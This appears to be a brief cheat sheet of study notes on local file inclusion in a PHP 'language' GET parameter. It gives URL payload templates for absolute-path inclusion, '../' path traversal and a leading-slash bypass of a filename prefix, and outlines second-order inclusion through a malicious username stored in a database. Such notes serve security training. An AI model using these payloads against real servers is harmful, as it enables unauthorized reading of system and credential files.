

Passing file names into get parameters
```
http://<SERVER_IP>:<PORT>/index.php?language=/PATH/FILE
```

Path traversal with get parameter
```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../PATH/FILE
```

Filename prefix evasion with prepended forward slash
```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../PATH/FILE
```


File Inclusion with usernames via back-end data retrieval
1. Can be done by using malicious username
2. Malicious username stored in database
3. Malicious username can be used to retrieve file data
